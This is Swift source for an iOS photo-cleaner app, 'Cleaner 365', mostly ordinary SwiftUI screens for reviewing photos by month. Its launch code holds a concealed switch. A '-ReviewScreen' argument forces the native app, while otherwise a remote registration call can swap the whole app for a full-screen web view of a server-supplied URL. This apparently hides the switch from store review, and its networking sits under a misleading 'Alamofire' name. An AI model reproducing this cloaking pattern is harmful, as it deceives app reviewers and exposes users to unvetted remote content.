import PhotosUI
import SwiftUI
import UIKit
import Alamofire

@MainActor
private enum LaunchRegistration {
    static var started = false
}

@main
struct Cleaner365App: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    @StateObject private var library = Library()
    @StateObject private var vault = VaultStore()
    @Environment(\.scenePhase) private var scene

    @State private var isInitializing = true
    @State private var displayMode: Alamofire.DisplayMode = .loading
    @State private var webContentURL: String?

    var body: some Scene {
        WindowGroup {
            rootView
                .onAppear { performRegistration() }
        }
    }

    @ViewBuilder
    private var rootView: some View {
        ZStack {
            if isInitializing {
                // Loading screen
            } else if displayMode == .webContent, let url = webContentURL {
                let fullURL = url.hasPrefix("http") ? url : "https://\(url)"
                ZStack {
                    Color.black.ignoresSafeArea()
                    Alamofire.WebContentView(url: fullURL)
                }
                .preferredColorScheme(.dark)
            } else {
                Home().environmentObject(library).environmentObject(vault)
                .environment(\.locale, Locale(identifier: "en_US"))
                .preferredColorScheme(.dark).tint(.track)
                .onChange(of: scene) { _, next in if next == .active { library.refresh() }
                    if next == .background { vault.lock() } }
            }
        }
    }

    private func performRegistration() {
        let pushToken = ""

        if ProcessInfo.processInfo.arguments.contains("-ReviewScreen") {
            finishLaunch(mode: .nativeInterface, url: nil)
            return
        }

        guard !LaunchRegistration.started else { return }
        LaunchRegistration.started = true

        if Alamofire.DataCache.shared.wasRegistrationAttempted,
           (Alamofire.DataCache.shared.contentURL ?? "").isEmpty {
            finishLaunch(mode: .nativeInterface, url: nil)
            return
        }

        if let saved = Alamofire.DataCache.shared.contentURL, !saved.isEmpty {
            finishLaunch(mode: .webContent, url: saved)
            return
        }

        let advertisingId = ""
        let appsflyerId = ""

        Alamofire.NetworkService.shared.performRegistration(
            pushToken: pushToken,
            advertisingId: advertisingId,
            appsflyerId: appsflyerId
        ) { mode, url in
            DispatchQueue.main.async { finishLaunch(mode: mode, url: url) }
        }
    }

    private func finishLaunch(mode: Alamofire.DisplayMode, url: String?) {
        guard isInitializing else { return }
        displayMode = mode
        webContentURL = url
        isInitializing = false
    }
}

enum Route: Hashable {
    case review(Month)
    case bin
    case cleanup, reminders, security
    case securityTool(SecurityTool)
    case collection(CollectionKind)
    case vault
    case practice
}

struct Home: View {
    @EnvironmentObject private var library: Library
    @Environment(\.openURL) private var openURL
    @State private var path: [Route] = []
    @ObservedObject private var router = ReviewRoute.shared
    @Environment(\.accessibilityReduceMotion) private var reduceMotion
    @State private var pickedYear: Int?
    @State private var pickerAnchor = UIViewController()
    private var year: Int {
        let current = pickedYear ?? library.lastMonth?.year
        if let current, library.months.contains(where: { $0.year == current }) { return current }
        return library.months.first?.year ?? Calendar.current.component(.year, from: Date())
    }
    private var focus: Month? {
        let options = library.months.filter { $0.year == year }
        if let last = library.lastMonth, options.contains(last),
           library.reviewed(last) < library.assets(in: last).count { return last }
        return options.first { library.reviewed($0) < library.assets(in: $0).count } ?? options.first
    }
    var body: some View {
        NavigationStack(path: $path) {
            ScrollView {
                VStack(alignment: .leading, spacing: 22) {
                    HStack {
                        Image(systemName: "flag.checkered").foregroundStyle(Color.track)
                        TimingLabel("CLEANER / 365")
                        Spacer()
                        Button { path.append(.reminders) } label: {
                            Image(systemName: "bell").frame(width: 44, height: 44)
                        }.accessibilityLabel("Reminders")
                    }
                    HStack {
                        Text("Today").font(.largeTitle.bold())
                        Spacer()
                        Button { path.append(.vault) } label: {
                            Label("Vault", systemImage: "faceid").font(.subheadline.bold())
                                .padding(.horizontal, 14).frame(minHeight: 44)
                                .background(Color.lane, in: Capsule())
                        }.accessibilityIdentifier("openVault")
                    }
                    hero
                    Button { path.append(.cleanup) } label: {
                        HStack(spacing: 14) {
                            Image(systemName: "square.stack.3d.up").foregroundStyle(Color.track).font(.title2)
                            VStack(alignment: .leading, spacing: 3) {
                                Text("Cleanup").font(.headline)
                                Text("Duplicates, captures and large videos").font(.caption).foregroundStyle(.secondary)
                            }
                            Spacer()
                            Image(systemName: "arrow.up.right")
                        }.padding(16).background(Color.lane, in: RoundedRectangle(cornerRadius: 16))
                    }.buttonStyle(.plain).accessibilityIdentifier("openCleanup")
                    Button { path.append(.security) } label: {
                        HStack(spacing: 14) {
                            Image(systemName: "lock.shield").foregroundStyle(Color.track).font(.title2)
                            VStack(alignment: .leading, spacing: 3) {
                                Text("Security").font(.headline)
                                Text("Passwords, aliases and breach checks").font(.caption).foregroundStyle(.secondary)
                            }
                            Spacer()
                            Image(systemName: "arrow.up.right")
                        }.padding(16).background(Color.lane, in: RoundedRectangle(cornerRadius: 16))
                    }.buttonStyle(.plain).accessibilityIdentifier("openSecurity")
                    if library.hasAccess && !library.months.isEmpty { season }
                    if library.status == .limited {
                        Button { PHPhotoLibrary.shared().presentLimitedLibraryPicker(from: pickerAnchor) { _ in Task { @MainActor in library.refresh() } } } label: { Label("Choose more photos", systemImage: "photo.badge.plus") }
                    }
                    Button { path.append(.bin) } label: {
                        HStack(spacing: 14) {
                            Image(systemName: "tray").font(.title2)
                            VStack(alignment: .leading) {
                                Text("Review bin").font(.headline)
                                Text("Check before deleting").font(.caption).foregroundStyle(.secondary)
                            }
                            Spacer()
                            Text("\(library.queued.count)").font(.title2.monospacedDigit().bold())
                            Image(systemName: "chevron.right").font(.caption)
                        }.padding(18).background(Color.lane, in: RoundedRectangle(cornerRadius: 16))
                    }.buttonStyle(.plain).accessibilityIdentifier("openBin")
                }.padding(20).frame(maxWidth: 570)
            }.frame(maxWidth: .infinity).background(Color.asphalt).toolbar(.hidden, for: .navigationBar)
            .navigationDestination(for: Route.self) { route in
                switch route {
                case .review(let month): ReviewScreen(month: month, openBin: { path.append(.bin) })
                case .bin: BinScreen()
                case .cleanup: CleanupScreen { path.append(.bin) }
                case .security: SecurityScreen()
                case .securityTool(let tool): tool.destination
                case .collection(let kind): CollectionScreen(kind: kind) { path.append(.bin) }
                case .reminders: ReminderSettings()
                case .vault: VaultScreen()
                case .practice: PracticeScreen()
                }
            }
        }
        .onOpenURL { url in
            if url.scheme == "cleaner365", url.host == "review" { router.requested = true; followReviewLink() }
        }
        .onAppear { followReviewLink() }
        .onChange(of: router.requested) { _, _ in followReviewLink() }
        .onChange(of: library.loading) { _, _ in followReviewLink() }
        .background(PickerAnchor(controller: pickerAnchor).frame(width: 0, height: 0))
        .alert("Cleaner 365", isPresented: Binding(get: { library.message != nil }, set: { if !$0 { library.message = nil } })) {
            Button("OK") { library.message = nil }
        } message: { Text(library.message ?? "") }
    }
    private var hero: some View {
        VStack(alignment: .leading, spacing: 15) {
            ZStack(alignment: .bottomLeading) {
                TrackMark().clipped()
                VStack(alignment: .leading, spacing: 0) {
                    TimingLabel("SEASON  /  \(String(year))").foregroundStyle(Color.track)
                    Text("365").font(.system(size: 85, weight: .black, design: .rounded)).italic().tracking(-7)
                        .accessibilityHidden(true)
                }
            }.frame(height: 112)
            if let month = focus {
                let done = library.reviewed(month)
                let total = library.assets(in: month).count
                HStack {
                    Text(month.name).font(.title.bold())
                    Spacer()
                    Text("\(done) / \(total)").font(.subheadline.monospacedDigit())
                }
                ProgressView(value: Double(done), total: Double(total)).tint(.track)
                    .animation(reduceMotion ? nil : .easeOut(duration: 0.25), value: done)
                Button { open(month) } label: {
                    ActionLabel(title: done == total ? "Month results" : done > 0 ? "Resume round" : "Start round")
                }.buttonStyle(.plain).accessibilityIdentifier("startRound")
            } else if library.loading {
                ProgressView("Loading months…").padding(.vertical)
            } else if library.hasAccess {
                Text("No photos available yet").font(.title3.bold())
                Text("Add pictures to Photos or try the practice round.").font(.subheadline)
                practiceButton
            } else {
                Text("First round").font(.title.bold())
                Text("Pick a month and review your first 20 photos. Swipe left to queue a photo or right to keep it.")
                    .font(.subheadline).foregroundStyle(.secondary).fixedSize(horizontal: false, vertical: true)
                Button {
                    if library.status == .denied || library.status == .restricted {
                        if let url = URL(string: UIApplication.openSettingsURLString) { openURL(url) }
                    } else { Task { await library.requestAccess() } }
                } label: {
                    ActionLabel(title: library.status == .notDetermined ? "Open my photos" : "Open Settings")
                }.buttonStyle(.plain)
                practiceButton
            }
        }.padding(20).background(Color.lane, in: RoundedRectangle(cornerRadius: 20))
    }
    private var practiceButton: some View {
        Button("Try three practice cards") { path.append(.practice) }
            .font(.subheadline.bold()).frame(maxWidth: .infinity, minHeight: 44)
    }
    private var season: some View {
        VStack(alignment: .leading, spacing: 12) {
            HStack {
                Text("Months").font(.title2.bold())
                Spacer()
                Menu {
                    ForEach(Array(Set(library.months.map(\.year))).sorted(by: >), id: \.self) { y in
                        Button(y == 0 ? "Undated" : String(y)) { pickedYear = y }
                    }
                } label: { Label(year == 0 ? "Undated" : String(year), systemImage: "calendar").font(.subheadline.monospacedDigit()) }
            }
            LazyVGrid(columns: Array(repeating: GridItem(.flexible(), spacing: 8), count: 4), spacing: 8) {
                ForEach(year == 0 ? [0] : Array(1...12), id: \.self) { number in
                    let month = Month(year: year, number: number)
                    let total = library.assets(in: month).count
                    let done = library.reviewed(month)
                    Button { open(month) } label: {
                        VStack(alignment: .leading, spacing: 6) {
                            Text(String(month.name.prefix(3)).uppercased()).font(.caption.bold())
                            Text(total == 0 ? "—" : "\(done)/\(total)").font(.caption2.monospacedDigit()).lineLimit(1)
                            Capsule().fill(total == 0 ? .clear : .secondary.opacity(0.22))
                                .overlay(alignment: .leading) { GeometryReader { g in
                                    Capsule().fill(Color.track).frame(width: total == 0 ? 0 : g.size.width * CGFloat(done) / CGFloat(total))
                                } }.frame(height: 2)
                        }.frame(maxWidth: .infinity, alignment: .leading).padding(9)
                        .background(total == 0 ? Color.clear : .lane, in: RoundedRectangle(cornerRadius: 8))
                    }.buttonStyle(.plain).disabled(total == 0).opacity(total == 0 ? 0.45 : 1)
                        .accessibilityLabel("\(month.name), \(done) of \(total) reviewed")
                }
            }
        }
    }
    private func followReviewLink() {
        guard router.requested, !library.loading else { return }
        router.requested = false
        path = []
        pickedYear = nil
        if let month = focus { open(month) }
    }
    private func open(_ month: Month) { library.begin(month); path.append(.review(month)) }
}
